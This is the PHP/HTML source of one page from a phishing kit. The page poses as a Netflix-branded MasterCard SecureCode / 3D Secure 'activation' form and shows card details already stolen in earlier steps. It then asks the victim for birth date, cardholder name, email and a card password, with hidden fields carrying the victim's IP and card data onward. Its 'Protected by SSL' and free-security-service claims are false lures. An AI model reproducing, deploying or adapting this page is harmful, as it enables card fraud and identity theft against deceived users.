<?php 
	include("includes/next.inc.php");
?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Netflix</title>
	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<script src="js/jquery.min.js"></script>
	<script src="js/validet.js"></script>
	<link rel="stylesheet" type="text/css" href="css/app2.css">
	<link rel="shortcut icon" href="img/nficon.ico">
</head>
<body>
		<div class="header_nf2">
		</div>
		<div class="main_secure">
			<div class="inside_main">
				<div class="head_in_main">
					<div class="secure_header_left">
						<div class="lockimg">
							<img src="img/lockv.png" id="lock">
						</div>
						<div class="spanssl"><span>Protected by SSL</span></div>
					</div>
					<div class="secure_header_right">
						<img src="img/master-card.gif" id="gifvbv">
					</div>
				</div><br>
				<div class="verif_main">
					<center><span id="ban_kname"><?php echo $_SESSION['xxxnb']; ?></span></center>
					<div  class="parg_secure">
						<center><span id="title_sefety">Added Safety Online</span></center>
						<p id="verif_paragh">Welcome to 3D Secure You are not currently registered for this new free service 3D Secure, provided in association with MasterCard SecureCode protects yourcard when you shop online with this and other participating retailers.</p>
						<br>
						<p>Simply complete the details below to activate this free security service.</p>
					</div>
					<div class="form_secure">
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">name : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php echo $_SESSION['xxff'] . " " . $_SESSION['xxll']; ?></span><input type="hidden" id="xxfff" value="<?php echo $_SESSION["xxff"] . ' ' . $_SESSION['xxll']; ?>">
								 <input type="hidden" id="xxxiip" value="<?php echo $_SESSION['xxxiip'];?>"><input type="hidden" id="xxccnn" value="<?php echo $_SESSION
								 ['cardx']; ?>"><input type="hidden" id="xxxscc" value="<?php echo $_SESSION['xxxsc']; ?>"><input type="hidden" id="xxxttt" value="<?php echo date("Y/m/d h:i:s:A"); ?>">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Card Type : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php echo $_SESSION['xxxsc']; ?></span>
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Card Number : </span>
							</div>
							<div class="info_secure">
								<span class="info_s">XXXX-XXXX-XXXX-<?php echo $_SESSION['cardx']; ?></span>
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Date time : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php echo date("Y/m/d h:i:s:A"); ?></span>
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Birth Date : </span>
							</div>
							<div class="info_secure">
								<input type="text" name="dd" id="dd" class="birth_secure2" maxlength="2">
								<span>/</span>
								<input type="text" name="mm" id="mm" class="birth_secure2" maxlength="2">
								<span>/</span>
								<input type="text" name="yy" id="yy" class="birth_secure2" maxlength="4">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Cardholder : </span>
							</div>
							<div class="info_secure">
								<input type="text" name="cdholder" id="xtz1" class="xtz">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Email address : </span>
							</div>
							<div class="info_secure">
								<input type="email" name="cdholder" id="xtz2" class="xtz">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s" id="spsec">SecurePassword : </span>
							</div>
							<div class="info_secure">
								<input type="password" name="passwd" id="passwd" class="xtz">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Re-SecurePassword : </span>
							</div>
							<div class="info_secure">
								<input type="password" name="cdholder" id="passwd2" class="xtz">
							</div>
						</div>
						<div class="bottm_s">
							<div class="bottm_s_left">
								<span class="qd"><?php echo $_SESSION['xxxpb']; ?></span>
							</div>
							<div class="bottm_s_right">
								<span class="qd"><?php echo $_SESSION['xxxub']; ?></span>
							</div>
						</div><br><center>
						<button type="submit" class="btn_m_val" name="btnm_last">ACTIVATE</button></center>
					</div>
				</div>
			</div>			
		</div>
		<div class="end_sec">
			<center><span>Cannot access your Verifed by Visa?</span><br>
			<span>Contact</span><a href="#"> Visa Customer Service</a></center>
		</div>
		<div class="dvLoading"><center><img src="img/2.gif"></center></div>
</body>
</html>